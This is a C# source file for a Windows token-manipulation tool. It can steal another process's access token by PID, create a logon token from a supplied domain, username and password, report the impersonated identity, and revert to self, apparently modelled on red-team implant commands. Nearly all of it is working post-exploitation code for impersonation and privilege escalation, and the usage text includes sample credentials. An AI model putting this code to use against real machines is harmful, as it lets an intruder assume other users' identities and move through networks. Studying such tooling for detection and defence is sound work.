using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace Tokens
{
    public class Program
    {
        public static void Main(string[] args) {
            if (args.Length < 1)
            {
                Usage();
                return;
            }
            if (args[0] == "make_token")
            {
                make_token(args);
            }
            else if (args[0] == "steal_token")
            {
                steal_token(args);
            }
            else if (args[0] == "get_token")
            {
                get_token();
            } 
            else if (args[0] == "rev2self")
            {
                rev2self();
            } else {
                Usage();
            }
        }

        public static void Usage()
        {
            Console.WriteLine("Usage:   Tokens.exe <function> [args]\n");
            Console.WriteLine("Usage:   Tokens.exe steal_token <pid>");
            Console.WriteLine("Usage:   Tokens.exe make_token <domain> <username> <password>");
            Console.WriteLine("Usage:   Tokens.exe whoami");
            Console.WriteLine("Usage:   Tokens.exe rev2self\n");
            Console.WriteLine("Example: Tokens.exe steal_token 4468");
            Console.WriteLine("Example: Tokens.exe make_token rayke.local sknecht WeakPass!");
            Console.WriteLine("Example: Tokens.exe whoami");
            Console.WriteLine("Example: Tokens.exe rev2self");
        }

        [DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        extern static bool CloseHandle(IntPtr handle);

        // Make Token

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool LogonUser(string pszUsername, string pszDomain, string pszPassword, LogonProvider dwLogonType, LogonUserProvider dwLogonProvider, out IntPtr phToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        public enum LogonProvider
        {
            LOGON32_LOGON_INTERACTIVE = 2,
            LOGON32_LOGON_NETWORK = 3,
            LOGON32_LOGON_BATCH = 4,
            LOGON32_LOGON_SERVICE = 5,
            LOGON32_LOGON_UNLOCK = 7,
            LOGON32_LOGON_NETWORK_CLEARTEXT = 8,
            LOGON32_LOGON_NEW_CREDENTIALS = 9
        }

        public enum LogonUserProvider
        {
            LOGON32_PROVIDER_DEFAULT = 0,
            LOGON32_PROVIDER_WINNT35 = 1,
            LOGON32_PROVIDER_WINNT40 = 2,
            LOGON32_PROVIDER_WINNT50 = 3
        }
        public static int make_token(string[] arguments)
        {
            var domain = "";
            var user = "";
            var password = "";
            try
            {
                domain = arguments[1];
                user = arguments[2];
                password = arguments[3];
            } 
            catch
            {
                Console.WriteLine("Failed to parse arguments for Make_Token");
                Usage();
                return 0;
            }


            if (LogonUser(user, domain, password, LogonProvider.LOGON32_LOGON_INTERACTIVE, LogonUserProvider.LOGON32_PROVIDER_DEFAULT, out var hToken))
            {
                if (ImpersonateLoggedOnUser(hToken))
                {
                    var identity = new WindowsIdentity(hToken);
                    CloseHandle(hToken);
                    Console.WriteLine($"Succesfully impersonated token {identity.Name}");
                    return 0;
                }
                CloseHandle(hToken);
                Console.WriteLine("Succesfully made token, but failed to impersonate");
                return 0;
            }
            else
            {
                CloseHandle(hToken);
                Console.WriteLine("Failed to make token.");
                return -32600;
            }
        }

        // Steal Token
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, TokenAccessFlags DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        extern static bool DuplicateTokenEx(IntPtr hExistingToken, TokenAccessFlags dwDesiredAccess, IntPtr lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, out IntPtr phNewToken);

        public enum SECURITY_IMPERSONATION_LEVEL
        {
            SecurityAnonymous,
            SecurityIdentification,
            SecurityImpersonation,
            SecurityDelegation
        }

        public enum TOKEN_TYPE
        {
            TokenPrimary = 1,
            TokenImpersonation
        }
        public enum TokenAccessFlags
        {
            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
            STANDARD_RIGHTS_READ = 0x00020000,
            TOKEN_ASSIGN_PRIMARY = 0x0001,
            TOKEN_DUPLICATE = 0x0002,
            TOKEN_IMPERSONATE = 0x0004,
            TOKEN_QUERY = 0x0008,
            TOKEN_QUERY_SOURCE = 0x0010,
            TOKEN_ADJUST_PRIVILEGES = 0x0020,
            TOKEN_ADJUST_GROUPS = 0x0040,
            TOKEN_ADJUST_DEFAULT = 0x0080,
            TOKEN_ADJUST_SESSIONID = 0x0100,
            TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY),
            TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
                TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
                TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
                TOKEN_ADJUST_SESSIONID)
        }
        public static int steal_token(string[] arguments)
        {
            int pid = 0;
            try
            {
                pid = int.Parse(arguments[1]);
            } catch
            {
                Console.WriteLine("Failed to parse parameters for steal_token");
                Usage();
                return 0;
            }
            Process process = Process.GetProcessById(pid);
            if (!OpenProcessToken(process.Handle, TokenAccessFlags.TOKEN_ALL_ACCESS, out var hToken))
            {
                Console.WriteLine("Failed to open process token.");
                return 0;
            }

            if (!DuplicateTokenEx(hToken, TokenAccessFlags.TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                                  TOKEN_TYPE.TokenPrimary, out var hTokenDup))
            {
                CloseHandle(hToken);
                process.Dispose();
                Console.WriteLine("Failed to duplicate token.");
                return -32600;
            }

            if (!ImpersonateLoggedOnUser(hTokenDup))
            {
                CloseHandle(hToken);
                process.Dispose();
                Console.WriteLine($"Failed to impersonated token");
                return -32600;
            }

            var identity = new WindowsIdentity(hTokenDup);

            CloseHandle(hToken);
            CloseHandle(hTokenDup);
            process.Dispose();

            Console.WriteLine($"Succesfully impersonated token {identity.Name}");
            return 0;
        }

        // RevertToSelf

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool RevertToSelf();
        public static int rev2self()
        {
            var current_identity = WindowsIdentity.GetCurrent().Name;
            if (RevertToSelf())
            {
                Console.WriteLine($"Dropped {current_identity} token, you are now {WindowsIdentity.GetCurrent().Name}");
                return 0;
            }
            else
            {
                Console.WriteLine($"Failed to drop impersonated token {current_identity}");
                return -32600;
            }
        }

        // GetCurrentToken

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, TokenAccessFlags DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        public static int get_token()
        {
            IntPtr tHandle = GetCurrentThread();
            if (!OpenThreadToken(tHandle, TokenAccessFlags.TOKEN_READ | TokenAccessFlags.TOKEN_IMPERSONATE, true, out IntPtr hToken))
            {
                Console.WriteLine("No impersonated tokens");
                return 0;
            }
            var identity = new WindowsIdentity(hToken);
            CloseHandle(hToken);
            Console.WriteLine($"Currently impersonating {identity.Name}");
            return 0;

        }
    }
}
